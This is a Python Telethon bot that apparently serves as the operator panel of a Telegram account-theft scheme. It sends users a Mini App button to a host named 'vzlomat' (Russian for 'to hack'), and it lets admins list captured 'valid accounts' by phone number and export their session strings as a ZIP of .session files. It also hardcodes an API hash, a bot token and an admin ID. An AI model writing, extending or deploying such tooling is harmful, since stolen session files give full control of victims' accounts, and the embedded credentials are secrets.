import os
import sys
import asyncio
import logging
import zipfile
import io
from datetime import datetime
from telethon import TelegramClient, events, errors
from telethon.sessions import StringSession

API_ID = int(os.environ.get("API_ID", 37803152))
API_HASH = os.environ.get("API_HASH", "5d34acaeda36aa1a308e40ae31668795")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8690036172:AAGj9YweZMAdEm4tI5YTKJs_n1oAB-BN78c")
ADMIN_IDS = [int(x.strip()) for x in os.environ.get("ADMIN_IDS", "8866175391").split(",") if x.strip()]
BASE_URL = os.environ.get("BASE_URL", "https://vzlomat.onrender.com")  # ← ДОБАВЬ ЭТУ ПЕРЕМЕННУЮ

os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("logs/admin_bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from session_manager import SessionManager

session_manager = SessionManager()
session_manager.configure(API_ID, API_HASH)

# ============================================================
# АДМИН-БОТ
# ============================================================
class AdminBot:
    def __init__(self):
        self.client = TelegramClient("admin_bot", API_ID, API_HASH)
        self.session_manager = session_manager

    async def start(self):
        await self.client.start(bot_token=BOT_TOKEN)
        logger.info("Admin bot started")
        
        stats = await self.session_manager.check_all_sessions()
        logger.info(f"Startup stats: {stats}")

        # ============================================================
        # ОБРАБОТЧИК КОМАНДЫ /start — ОТПРАВЛЯЕТ КНОПКУ С MINI APP
        # ============================================================
        @self.client.on(events.NewMessage(pattern="/start"))
        async def start_cmd(event):
            user_id = event.sender_id
            
            # КНОПКА ДЛЯ ВСЕХ ПОЛЬЗОВАТЕЛЕЙ
            keyboard = {
                "inline_keyboard": [[{
                    "text": "🚀 Open Panel",
                    "web_app": {"url": BASE_URL}
                }]]
            }
            
            # ЕСЛИ АДМИН — ПОКАЗЫВАЕМ ДОПОЛНИТЕЛЬНОЕ МЕНЮ
            if user_id in ADMIN_IDS:
                await event.respond(
                    "👋 Welcome! Click the button to open the Mini App.\n\n"
                    "🔐 Admin: use /admin for management.",
                    buttons=keyboard
                )
            else:
                await event.respond(
                    "👋 Welcome! Click the button to open the Mini App.",
                    buttons=keyboard
                )

        @self.client.on(events.NewMessage(pattern="/admin"))
        async def admin_cmd(event):
            if event.sender_id not in ADMIN_IDS:
                await event.respond("⛔ Access denied")
                return
            stats = self.session_manager.get_stats()
            buttons = [
                [{"text": "📱 Accounts", "callback_data": "accounts"}],
                [{"text": "📊 Statistics", "callback_data": "stats"}],
                [{"text": "📦 Export (ZIP)", "callback_data": "export"}]
            ]
            await event.respond(
                f"🔐 Admin Panel\n\n"
                f"📊 Stats:\n"
                f"├ Total: {stats.get('total', 0)}\n"
                f"├ ✅ Valid: {stats.get('valid', 0)}\n"
                f"└ ❌ Invalid: {stats.get('invalid', 0)}",
                buttons=buttons
            )

        @self.client.on(events.CallbackQuery)
        async def callback_handler(event):
            if event.sender_id not in ADMIN_IDS:
                await event.answer("⛔ Access denied", alert=True)
                return
            data = event.data.decode("utf-8")
            if data == "accounts":
                await self._show_accounts(event)
            elif data == "stats":
                stats = self.session_manager.get_stats()
                await event.edit(
                    f"📊 Statistics:\n\n"
                    f"├ Total: {stats.get('total', 0)}\n"
                    f"├ ✅ Valid: {stats.get('valid', 0)}\n"
                    f"└ ❌ Invalid: {stats.get('invalid', 0)}"
                )
            elif data == "export":
                await self._export_sessions(event)
            elif data == "back":
                await admin_cmd(event)

        await self.client.run_until_disconnected()

    async def _show_accounts(self, event):
        accounts = self.session_manager.get_valid_sessions()
        if not accounts:
            await event.edit("📭 No valid accounts")
            return
        text = "📱 Valid Accounts:\n\n"
        for idx, acc in enumerate(accounts):
            phone = acc.get("phone", "Unknown")
            created = acc.get("created_at", "")[:10]
            text += f"{idx+1}. 📱 {phone} | 📅 {created}\n"
        text += "\n◀️ Press Back"
        buttons = [[{"text": "◀️ Back", "callback_data": "back"}]]
        await event.edit(text, buttons=buttons)

    async def _export_sessions(self, event):
        accounts = self.session_manager.get_valid_sessions()
        if not accounts:
            await event.edit("📭 No sessions")
            return
        await event.edit("⏳ Creating archive...")
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
            for acc in accounts:
                phone = acc.get("phone", "unknown")
                session_string = self.session_manager.get_session_file(phone)
                if session_string:
                    zf.writestr(f"{phone.replace('+', '')}.session", session_string)
        zip_buffer.seek(0)
        await self.client.send_file(
            event.sender_id,
            zip_buffer,
            file_name=f"sessions_{datetime.now().strftime('%Y%m%d_%H%M')}.zip",
            caption=f"📦 Sessions: {len(accounts)}"
        )
        await event.edit("✅ Archive sent")

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == "__main__":
    if not all([API_ID, API_HASH, BOT_TOKEN]):
        logger.error("Missing env variables!")
        sys.exit(1)
    bot = AdminBot()
    asyncio.run(bot.start())